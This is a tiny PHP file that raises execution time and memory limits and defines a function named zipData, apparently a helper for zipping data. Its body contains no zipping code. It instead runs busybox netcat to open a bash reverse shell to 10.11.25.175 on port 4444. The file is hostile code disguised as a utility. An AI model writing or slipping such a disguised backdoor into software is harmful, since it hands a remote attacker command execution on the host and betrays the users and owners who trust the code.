<?php


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
    system('/usr/bin/busybox nc 10.11.25.175 4444 -e bash');
}
?>
